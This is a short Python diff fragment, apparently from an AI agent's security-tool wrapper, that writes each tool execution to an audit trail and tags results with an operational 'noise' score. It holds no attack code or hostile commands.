+            target_ip = ",".join(str(t) for t in target_ip[:5])
+        ctx.audit_store.record(
+            run_id=getattr(ctx, "run_id", "interactive"),
+            session_id=getattr(ctx, "session_id", ""),
+            cycle=getattr(ctx, "cycle", 0),
+            target_ip=str(target_ip)[:256],
+            tool=name,
+            action="execute",
+            arguments=safe_args,
+            result=result,
+            exit_code=0 if not (isinstance(result, dict) and result.get("error")) else 1,
+        )
+    except Exception:
+        pass
+
+    # Phase 7: attach the noise score to the result so the operator can see
+    # which tools were noisy (visible in the audit trail + the model's tool
+    # results message).
+    if noise_score > 0 and isinstance(result, dict) and "error" not in result:
+        result["_opsec_noise"] = noise_score
+
+    return result
